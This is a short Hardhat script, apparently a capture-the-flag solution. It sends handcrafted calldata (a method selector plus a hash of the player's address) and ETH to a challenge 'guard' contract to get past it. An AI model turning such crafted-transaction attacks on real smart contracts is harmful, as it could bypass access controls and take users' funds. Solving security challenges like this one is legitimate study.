// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
  // We get the contract to deploy

  // change ffLib address
  // console.log('ffLibAttack.address:', ffLibAttack.address);
  const [player] = await hre.ethers.getSigners();

  const methodData = '0xF00B8676';
  const argData = ethers.utils.keccak256(player.address).slice(2, 58) + '30303030';
  console.log('argData:', argData);
  console.log(player.address);

  const guardAddress = '0x0ae8bf62ef8a156637a3d56778dfa20a08ea7e18'; // get from browser console

  await player.sendTransaction({
      from: player.address,
      to: guardAddress,
      data: methodData + argData,
      gasLimit: 200000,
      value: '0x5E335D9ECCD2001'
  });
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
